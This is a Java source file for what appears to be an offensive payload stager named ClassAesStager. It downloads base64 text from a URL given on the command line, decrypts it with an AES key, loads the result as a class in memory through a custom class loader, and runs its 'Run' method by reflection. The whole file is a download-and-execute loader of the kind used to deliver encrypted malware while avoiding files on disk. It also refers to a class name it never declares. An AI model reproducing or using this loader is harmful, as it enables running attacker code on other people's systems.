import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLConnection;

/*

*/
public class ClassAesStager {

    static class U extends ClassLoader{
        U(ClassLoader c){
            super(c);
        }
        public Class g(byte []b){
            return super.defineClass(b,0,b.length);
        }
    }

    public static void main(String args[]) {

        // Check how many arguments were passed in
        if (args.length != 2) {
            System.out.println("Proper Usage is: java -jar JavaClassStager-0.1-initial.jar <url> <aeskey>");
            System.exit(0);
        }
        // if we get here then a parameter was provided.
        String u = args[0];
        String k =args[1];
        System.out.println("[*] URL provided: " + u);

        try {
            URL payloadServer = new URL(u);
            URLConnection yc = payloadServer.openConnection();
            BufferedReader in = new BufferedReader(new InputStreamReader(
                    yc.getInputStream()));

            // Download source into memory
            String inputLine;
            StringBuffer payloadCode = new StringBuffer();
            while ((inputLine = in.readLine()) != null) {
                payloadCode.append(inputLine + "\n");
            }
            System.out.println("[*] Downloaded payload");
            Cipher c=Cipher.getInstance("AES/ECB/PKCS5Padding");
            c.init(2,new SecretKeySpec(k.getBytes("utf-8"),"AES"));
            System.out.println("[*] Base64 Decode ......");
            byte[] payloadbyte = new sun.misc.BASE64Decoder().decodeBuffer(payloadCode.toString());
            System.out.println("[*] Aes Decode ......");
            Class pcls = new U(ClassStager.class.getClassLoader()).g(c.doFinal(payloadbyte));
            //reflect
            System.out.println("[*] Reflect ......");
            Object o =pcls.newInstance();
            Method m = pcls.getMethod("Run");
            m.invoke(o);
        } catch (Exception ex) {
            ex.printStackTrace();
        }

    }

}
